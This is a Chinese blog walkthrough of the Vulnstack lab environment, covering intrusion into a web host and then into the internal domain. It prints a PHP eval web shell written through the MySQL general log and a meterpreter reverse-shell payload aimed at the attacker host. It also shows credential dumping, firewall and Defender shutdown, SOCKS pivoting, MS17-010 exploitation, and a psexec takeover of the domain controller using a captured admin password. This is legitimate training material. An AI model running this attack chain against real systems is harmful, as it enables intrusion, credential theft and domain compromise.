# **Vulnstack靶机练习（一）**

## **前言**

首先感谢红日安全团队开源的靶机环境，具体的下载地址：
http://vulnstack.qiyuanxuetang.net/vuln/detail/2/

本文基于vulnstack靶机环境来聊聊内网渗透的那些事。

## **本地环境搭建**

kali 攻击机  192.168.54.130

vulnstack-win7 第一层靶机 对外暴漏服务
192.168.54.129
192.168.52.143

vulnstack-Win2K3 域内靶机
192.168.52.141

vulnstack-winserver08 域控主机
192.168.52.138

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112104940195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)


## **第一层靶机渗透**

假设vulnstack-win7为第一层靶机，并且对外提供服务，攻击者能直接访问该机器暴漏的web服务，攻击者获取了该机器的IP地址192.168.54.129，于是尝试对该主机进行端口探测：

```shell
root@kali:~# nmap -sV -Pn 192.168.54.129
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-12 11:01 CST
Nmap scan report for 192.168.54.129
Host is up (0.00045s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:EA:57:EC (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.63 seconds
```

发现主机除了暴漏web服务外，还暴露了mysql服务，后台使用windows操作系统，我们先看mysql服务有什么可以利用点

### **mysql服务信息搜集及利用**
扫描一下看mysql服务是否支持外连
```shell
msf5 auxiliary(scanner/mysql/mysql_login) > run

[-] 192.168.54.129:3306   - 192.168.54.129:3306 - Unsupported target version of MySQL detected. Skipping.
[*] 192.168.54.129:3306   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_login) > mysql -h 192.168.54.129 -uroot
[*] exec: mysql -h 192.168.54.129 -uroot

ERROR 1130 (HY000): Host '192.168.54.130' is not allowed to connect to this MySQL server
msf5 auxiliary(scanner/mysql/mysql_login) > clear
```
发现无法利用，此路不通另寻别路。

### **Web服务信息搜集及利用**

根据扫描出来的信息
```shell
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
```
发现是一个PHP的站点，直接访问：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112112935160.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

根据能发现有管php的很多信息，比如已编译模块检测、PHP相关参数等，但是没有发现能直接利用的点，接着尝试扫描一下网站目录，看是否能发现一些其他的有用信息。

发现后台存在phpMyAdmin

```shell
[11:35:09] 200 -   71KB - /phpinfo.php
[11:35:09] 301 -  241B  - /phpmyadmin  ->  http://192.168.54.129/phpmyadmin/
[11:35:09] 301 -  241B  - /phpMyAdmin  ->  http://192.168.54.129/phpMyAdmin/
[11:35:09] 403 -  221B  - /phpMyAdmin.%2A
[11:35:10] 200 -    4KB - /phpMyAdmin/
[11:35:10] 200 -    4KB - /phpmyadmin/
[11:35:10] 200 -    4KB - /phpMyadmin/
[11:35:10] 200 -    4KB - /phpmyAdmin/
```
尝试phpMyAdmin弱口令root登录，发现能成功登录，并且能清楚的看到后台还有一个yxcms, 可尝试使用cms的漏洞getshell。这里我们先尝试使用phpMyAdmin的相关漏洞看能否getshell。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112173144541.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)

phpMyAdmin利用方式有多种：
+ 直接写入文件getshell
+ 利用日志getshell
+ 利用本地文件包含漏洞getshell

首先尝试写文件，发现无法写文件
```shell
SHOW VARIABLES LIKE '%secure%';
secure_file_priv值为NULL，说明禁止导出。
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112174117442.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)
再尝试利用日志来获取shell:

第一步手动开启日志

```sql
set global general_log='on';
```

然后 查看是否开启成功

```sql
show variables like "general_log%";
```
设置日志输出的路径
```sql
set global  general_log_file ="C:\\phpStudy\\WWW\\test.php";
```
然后只要执行的语句都会写入到日志文件中，所以我们查询语句
```sql
select "<?php eval($_POST['a']);?>";
```
发现能成功获取shell
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200112180118772.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70)
然后利用菜刀连接，上传反弹木马，获取一个meterpreter控制会话：
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.54.130 LPORT=4444 -f exe > shell.exe
```
```shell
msf5 exploit(multi/handler) > run

[*] Started bind TCP handler against 192.168.54.129:4444
[*] Sending stage (206403 bytes) to 192.168.54.129
[*] Meterpreter session 1 opened (192.168.54.130:33269 -> 192.168.54.129:4444) at 2020-01-12 07:39:32 -0500

meterpreter >
meterpreter > dir
Listing: C:\phpStudy
====================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  Apache
40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  IIS
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  MySQL
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  SQL-Front
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  WWW
40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  backup
40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  nginx
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  php
100777/rwxrwxrwx  2471424  fil   2019-10-13 04:39:38 -0400  phpStudy.exe
100666/rw-rw-rw-  113      fil   2019-10-13 04:39:25 -0400  phpStudy官网.url
100666/rw-rw-rw-  522752   fil   2019-10-13 04:39:38 -0400  phpshao.dll
100777/rwxrwxrwx  7168     fil   2020-01-12 07:36:46 -0500  shell.exe
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  tmp
40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  tools

meterpreter >
```
将会话信息派生给CS
首先在CobaltStrike中创建一个监听者，和上一步类似，这里host需要修改为CobaltStrike客户端IP，创建好之后便监听8099端口，等待着被控机连接
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200411164543473.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70#pic_center)

```shell
meterpreter > background
[*] Backgrounding session 11...
msf5 exploit(multi/handler) > use exploit/windows/local/payload_inject
msf5 exploit(windows/local/payload_inject) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf5 exploit(windows/local/payload_inject) > set lhost 192.168.54.130
lhost => 192.168.54.130
msf5 exploit(windows/local/payload_inject) > set lport 8090
lport => 8090
msf5 exploit(windows/local/payload_inject) > set DisablePayloadHandler true
DisablePayloadHandler => true
msf5 exploit(windows/local/payload_inject) > set session 1
session => 1
msf5 exploit(windows/local/payload_inject) > run
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200411164836322.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70#pic_center)

使用CS尝试尝试抓取密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200411170439927.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70#pic_center)

尝试远程桌面登录，发现3389端口未开启，于是尝试开启端口
netstat -an | find "3389"
chcp 65001

```shell
REG ADD HKLMSYSTEMCurrentControlSetControlTerminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

发现还是连接不上，尝试关闭防火墙。

```shell
run post/windows/manage/enable_rdp
```

然后尝试使用抓取的用户密码登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200411171852486.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70#pic_center)
远程桌面登录，发现非服务器的windows只能允许一个用户登录，如果一定要登录就会让已经登录了的用户下线
上传Windows用户多开工具rdpwrap

接下来进行本地信息搜集发现
* 多网卡
* 域控信息
* 其他重要文件等信息

域：god.org

域内有三个用户：Administrator、ligang、liukaifeng01

域内三台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA

域控：OWA(192.168.52.138)

win7内网ip：192.168.52.143

## 进一步内网渗透

```shell
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24

[*] Running module against STU1
[*] ARP Scanning 192.168.52.0/24
[+]     IP: 192.168.52.2 MAC 00:50:56:c0:00:02 (VMware, Inc.)

[+]     IP: 192.168.52.138 MAC 00:0c:29:f1:dd:6b (VMware, Inc.)
[+]     IP: 192.168.52.143 MAC 00:0c:29:ea:57:f6 (VMware, Inc.)
[+]     IP: 192.168.52.141 MAC 00:0c:29:d0:87:62 (VMware, Inc.)
```
或者使用meterpreter > arp -a
发现存活主机。

创建代理，进一步攻击内网靶机
在CS的becon中执行
```
socks 1024
```
更改/etc/proxychains.conf,使用namp扫描目标机器ROOT-TVI862UBEH(192.168.52.141)端口
```shell
oot@kali:~/sec-tools/Cobalt Strike 4.0# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 192.168.52.141
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 11:05 EDT
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:22-<--denied
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:135-<><>-OK
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:80-<--denied
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:445-<><>-OK
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:139-<><>-OK
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:135-<><>-OK
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:139-<><>-OK
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:445-<><>-OK
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:135-<><>-OK
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.141:139-<><>-OK
Nmap scan report for 192.168.52.141
Host is up (0.75s latency).

PORT    STATE  SERVICE      VERSION
22/tcp  closed ssh
80/tcp  closed http
135/tcp open   msrpc        Microsoft Windows RPC
139/tcp open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open   microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.26 seconds

oot@kali:~/sec-tools/Cobalt Strike 4.0# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 192.168.52.138
map scan report for 192.168.52.138
Host is up (8.8s latency).

PORT    STATE  SERVICE      VERSION
22/tcp  closed ssh
80/tcp  open   http         Microsoft IIS httpd 7.5
135/tcp open   msrpc        Microsoft Windows RPC
139/tcp open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open   microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: GOD)
Service Info: Host: OWA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.05 seconds

```
扫描发现都开了445端口，

本地启动Metasploit，挂上代理，就可以对目标内网进行各种探测搜集。如 探测目标内网中存在MS17_010漏洞的主机，这也是内网拿主机权限利用方式之一。
```shell
msf5 > setg Proxies socks4:192.168.54.130:1024 #让msf所有模块的流量都通过此代理走。(setg全局设置)
msf5 > setg ReverseAllowProxy true #允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)
msf5 > use auxiliary/scanner/smb/smb_ms17_010
msf5 > set rhosts 192.168.52.138-141
msf5 > set threads 100
msf5 > run

[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.52.141
rhosts => 192.168.52.141
msf5 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.52.141:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2003 3790 x86 (32-bit)
[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.52.138
rhosts => 192.168.52.138
msf5 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.52.138:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.52.138:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

```

#### 针对域内机器192.168.52.141

尝试ms17-010，直接拿不到shell，发现可以使用auxiliary/admin/smb/ms17_010_command来执行一些命令且是系统权限，于是执行新建用户添加管理员，打开3389，然后通过proxychains远程桌面连接
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200411235737928.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70#pic_center)


#### 针对域控制器192.168.52.138
开始尝试使用smb漏洞反弹，一直不成功，试着关闭防火墙
```shell
msf5 auxiliary(admin/smb/ms17_010_command) > set COMMAND netsh advfirewall set allprofiles state off
COMMAND => netsh advfirewall set allprofiles state off
msf5 auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.52.138:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(admin/smb/ms17_010_command) > set COMMAND net stop windefend
COMMAND => net stop windefend
msf5 auxiliary(admin/smb/ms17_010_command) > run

[*] 192.168.52.138:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(admin/smb/ms17_010_command) >
```

之前抓到了域管理的账号密码所以直接使用exploit/windows/smb/psexec模块拿下域控服务器，且是管理员权限

```shell
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   RHOSTS                192.168.52.138                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                                yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                     no        The service display name
   SERVICE_NAME                                                                             no        The service name
   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             GOD                                                                no        The Windows domain to use for authentication
   SMBPass               hongrisec@2021                                                     no        The password for the specified username
   SMBUser               Administrator                                                      no        The username to authenticate as


Payload options (windows/x64/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST     192.168.52.138   no        The target address
   
[*] 192.168.52.138:445 - Connecting to the server...
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.138:445-<><>-OK
[*] 192.168.52.138:445 - Authenticating to 192.168.52.138:445 as user 'Administrator'...
[*] 192.168.52.138:445 - Selecting PowerShell target
[*] 192.168.52.138:445 - Executing the payload...
[+] 192.168.52.138:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 192.168.52.138:4445
|S-chain|-<>-127.0.0.1:1024-<><>-192.168.52.138:4445-<><>-OK
[*] Sending stage (206403 bytes) to 192.168.52.138
[*] Meterpreter session 1 opened (127.0.0.1:56358 -> 127.0.0.1:1024) at 2020-04-11 13:16:55 -0400

meterpreter > background 

```

参考
【1】https://www.cnblogs.com/nongchaoer/p/12055317.html
